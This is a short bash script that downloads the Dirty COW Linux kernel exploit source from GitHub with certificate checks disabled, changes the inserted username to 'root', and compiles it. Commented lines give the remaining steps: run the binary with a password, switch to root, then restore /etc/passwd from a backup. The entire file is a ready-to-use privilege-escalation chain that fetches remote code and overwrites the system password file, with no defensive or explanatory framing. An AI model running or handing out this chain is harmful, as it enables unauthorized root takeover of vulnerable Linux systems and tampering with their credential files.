#!/bin/bash

curl -k https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c > dirty.c

sed -i 's/firefart/root/g' dirty.c

gcc -pthread dirty.c -o dirty -lcrypt

# ./dirty 2142
# su root

# mv /tmp/passwd.bak /etc/passwd